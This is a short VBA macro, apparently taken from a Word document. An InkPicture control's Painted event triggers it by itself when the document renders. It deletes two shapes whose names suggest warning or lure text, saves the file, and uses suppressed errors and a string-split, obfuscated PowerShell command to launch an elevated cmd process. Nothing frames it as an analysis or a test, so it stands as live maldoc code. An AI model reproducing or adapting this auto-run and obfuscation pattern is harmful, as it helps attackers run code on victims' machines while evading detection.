Public Once As Integer

Public Sub Launch()
    On Error Resume Next
    DeleteWarningShape "shape1", True
    DeleteWarningShape "shape2", True
    Shell "pow" & "ersh" & "ell.e" & "xe -Comm" & "and " & Chr(34) & "Sta" & "rt-Pro" & "cess cm" & "d -Ve" & "rb Ru" & "nAs", vbNormalFocus
End Sub

Private Sub DeleteWarningShape(ByVal textBoxName As String, ByVal saveDocAfter As Boolean)
    Dim shape As Word.shape
    On Error Resume Next
    For Each shape In ActiveDocument.Shapes
        If StrComp(shape.Name, textBoxName) = 0 Then
            shape.Delete
            Exit For
        End If
    Next
    If saveDocAfter Then
        ActiveDocument.Save
    End If
End Sub

Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle)
    If Once < 1 Then
        Launch
    End If
    Once = Once + 1
End Sub
